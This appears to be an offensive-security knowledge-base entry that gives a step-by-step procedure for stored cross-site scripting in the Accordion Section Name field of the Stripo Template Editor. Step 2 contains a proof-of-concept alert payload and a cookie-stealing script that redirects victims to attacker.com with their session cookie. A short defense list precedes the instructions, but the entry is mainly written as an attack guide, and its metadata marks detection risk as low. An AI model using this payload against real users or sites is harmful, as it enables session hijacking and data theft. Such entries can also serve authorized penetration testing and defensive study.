---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:08.474Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Accordion-Section-Name

## Summary

This procedure exploits insufficient input sanitization in the Stripo Template Editor's Accordion block Section Name field to inject and store malicious JavaScript, which persists in the template and executes for subsequent viewers.

## Description

In the Stripo platform, the Template Editor allows users to build email templates using blocks like Accordion. The Section Name field within an Accordion block does not properly escape or sanitize user input, enabling stored XSS. An attacker with edit access injects a script payload, saves the template, and when another user (e.g., an admin or collaborator) views or interacts with it, the script executes in their browser, potentially stealing session tokens or sensitive data. Discovered in 2020, this affects authenticated users and has medium severity due to its persistence and targeted impact.

## Requirements

1. Authenticated access to Stripo Template Editor
2. Browser for manual input (no special tools needed)
3. Knowledge of JavaScript payloads for exploitation

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output escaping (e.g., using DOMPurify) for all user-controlled fields
- Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript execution or unexpected network requests from the editor

## Objectives

1. Persistently store malicious JavaScript in the template
2. Achieve execution in victim browsers upon template view
3. Enable data exfiltration or session takeover

## Instructions

### Step 1: Access Template Editor

**Context**: Log in and navigate to create or edit a template to access the block editor.

Open the Stripo platform in a browser, authenticate, and start a new template or edit an existing one.

### Step 2: Add Accordion Block and Inject Payload

**Context**: Insert an Accordion block and target the Section Name field for injection.

Drag an Accordion block into the template, expand its settings, and enter the payload in the Section Name field. For proof-of-concept: `<script>alert('XSS');</script>`. For exploitation: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>`.

> The field accepts the input without validation, storing it as HTML.

### Step 3: Save and Verify Storage

**Context**: Save the template to persist the payload and check for reflection.

Click save or publish the template. Preview it to confirm the payload is stored (e.g., section name shows the script tag).

> Expected output: Template saves successfully; payload visible in preview source via browser inspector.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
